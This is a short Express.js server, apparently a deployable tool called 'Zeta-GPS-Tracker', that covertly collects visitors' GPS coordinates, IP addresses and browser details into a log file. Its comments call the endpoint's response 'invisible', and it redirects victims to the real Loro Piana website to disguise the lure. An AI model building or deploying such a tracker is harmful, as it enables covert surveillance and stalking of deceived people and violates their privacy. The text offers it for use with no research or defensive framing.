const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 10000;

// Trust Proxy für korrekte IP-Erkennung
app.set('trust proxy', true);

// GPS-Daten entgegennehmen
app.get('/log-gps', (req, res) => {
    const { lat, lon, accuracy } = req.query;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];
    
    fs.appendFileSync('gps.log', 
        `[${new Date().toISOString()}] IP: ${ip} | Agent: ${userAgent} | GPS: ${lat},${lon} (±${accuracy}m)\n`
    );
    res.sendStatus(204); // Unsichtbare Antwort
});

// Weiterleitung zur echten Website
app.get('/redirect', (req, res) => {
    res.redirect('https://de.loropiana.com/de/?gad_source=1&gad_campaignid=2059507353&gclid=CjwKCAjw3rnCBhBxEiwArN0QE1rzJVXiBN1r4KFwYYYVu9jevgKhEP7bKrfu5642nq3-UHbWU5vYOhoC5xwQAvD_BwE&utm_campaign=LPiana_FLG_DEU_BRANEXAC_UNI_MUL_OGOING_EC_BREX_GTAD_CRD_DEU_EUR_EXTM_BranExact&utm_medium=cpc&utm_source=google'); // Hier Ziel-URL eintragen
});

// Hauptseite mit Tracking
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Zeta-GPS-Tracker läuft auf Port ${PORT} 🏴‍☠️`));
